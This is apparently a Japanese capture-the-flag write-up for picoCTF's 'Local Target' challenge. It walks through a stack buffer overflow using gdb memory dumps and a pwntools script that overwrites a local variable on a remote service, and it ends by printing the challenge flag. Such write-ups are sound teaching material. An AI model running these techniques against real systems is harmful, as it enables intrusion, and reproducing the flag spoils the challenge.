# Local Target:Binary Exploitation

Smash the stack\
Can you overflow the buffer and modify the other local variable? The program is available [here](). You can view source [here](). And connect with it using: `nc saturn.picoctf.net 60800`

# Solution

とりあえず、`nc saturn.picoctf.net 60800`を実行してみる。
```
$ nc saturn.picoctf.net 60800
Enter a string: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

num is 1633771873
Bye!
```
1633771873=0x61616161なので、aが4文字分出力されている。
ソースコードを見てみる。
```c
if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }
```
出力される数字が65であれば良いようだ。
```c
int num = 64;
```
とあり、逆アセンブルの結果、このnumは
```
0x0000000000401242 <+12>:    mov    DWORD PTR [rbp-0x8],0x40
```
rbp-0x8にあるようだ。バッファオーバーフローさせてrbp-0x8を65=0x41に書き換える。
main+68にブレイクポイントを設定してバッファオーバーフローさせたときのrbpを見てみる。
```
(gdb) break *main+68
Breakpoint 1 at 0x40127a
(gdb) r
Starting program: /home/colza-picoctf/local-target 
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter a string: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, 0x000000000040127a in main ()
(gdb) x/100bx $rbp-0x8
0x7fff61eb63e8: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fff61eb63f0: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fff61eb63f8: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fff61eb6400: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fff61eb6408: 0x00    0x12    0x40    0x00    0x00    0x00    0x00    0x00
```
aが32文字分ある。56文字入力したので`24文字+65`を入力すれば良さそう。
以下、実行コード。
```python
from pwn import *

p = remote("saturn.picoctf.net", 60800)

payload = b"a"*24
payload += p64(0x00000041)

p.sendline(payload)

p.interactive()
```
実行してみる。
```
Enter a string: 
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_ee58441a}
```
フラグが得られた。

`picoCTF{l0c4l5_1n_5c0p3_ee58441a}`
